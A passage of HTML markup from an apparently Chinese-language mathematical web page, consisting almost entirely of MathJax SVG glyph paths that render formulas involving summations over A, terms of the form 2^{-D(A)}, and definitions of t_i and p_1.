117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="26.769ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11831.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(10553.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(11331.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.768ex;" xmlns="http://www.w3.org/2000/svg" width="28.506ex" height="5.036ex" role="img" focusable="false" viewBox="0 -1002.7 12599.7 2226"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mn" transform="translate(536,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1217.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2273.1,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="munder" transform="translate(2939.8,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(456.8,-1123.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4383.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(4772.8,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(778,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2042.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2431.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(3181.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8102.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(9103,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(778,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2042.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2431.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(3181.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(12210.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.768ex;" xmlns="http://www.w3.org/2000/svg" width="43.341ex" height="6.347ex" role="img" focusable="false" viewBox="0 -1581.9 19156.7 2805.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mn" transform="translate(536,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1217.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2273.1,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(456.8,-1123.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mi" transform="translate(3883.8,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4761.8,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5106.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 